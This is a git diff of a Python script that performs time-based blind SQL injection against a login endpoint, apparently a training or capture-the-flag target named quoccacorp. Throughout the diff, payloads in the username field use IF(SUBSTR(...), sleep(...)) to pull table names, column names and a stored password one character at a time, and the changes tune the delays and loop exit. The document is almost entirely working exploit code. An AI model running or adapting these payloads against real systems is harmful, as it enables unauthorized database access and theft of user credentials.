@@ -25,23 +25,31 @@ headers = {
 }
 res = ""
 for index in range(1,200):
+    length = len(res)
     for i in range(65,128):
         
         #index = 1
-        data1 = {
-            "username":f"' + (IF(SUBSTR(  (SELECT password FROM users LIMIT 1 OFFSET 1),{index},1)='" + chr(i) + "' ,sleep(1),1))-- c",
+        data = {
+            "username":f"' + (IF(SUBSTR(  (SELECT table_name FROM information_schema.tables LIMIT 1),{index},1)='{chr(i)}' ,sleep(0.5),1))-- c",
             "password":""
         }
-        data = {
-            "username":f"' + (IF(SUBSTR(  (SELECT column_name FROM information_schema.columns WHERE table_name = 'users' LIMIT 1 OFFSET 5),{index},1)='{chr(i)}' ,sleep(3),1))-- c",
+        data1 = {
+            "username":f"' + (IF(SUBSTR(  (SELECT column_name FROM information_schema.columns WHERE table_name = 'users' LIMIT 1 OFFSET 5),{index},1)='{chr(i)}' ,sleep(0.5),1))-- c",
+            "password":""
+        }
+        data2 = {
+            "username":f"' + (IF(SUBSTR((SELECT password FROM users LIMIT 1 OFFSET 0),{index},1)='" + chr(i) + "' ,sleep(0.5),1))-- c",
             "password":""
         }
 
-        r = requests.post("https://login.quoccacorp.com/v3", headers=headers,data=data1,proxies=proxies, verify=False)
+        r = requests.post("https://login.quoccacorp.com/v3", headers=headers,data=data2,proxies=proxies, verify=False)
         print("trying offset", index, "char ", chr(i),"cur res = ",res,i,r.elapsed.total_seconds(),end="\r")
-        if r.elapsed.total_seconds() > 1:
+        if r.elapsed.total_seconds() > 0.5:
             res += chr(i)
             break
+    if len(res) == length:
+        break
+    length = len(res)
             #print(res)
         #print(r.headers)
 print(res)
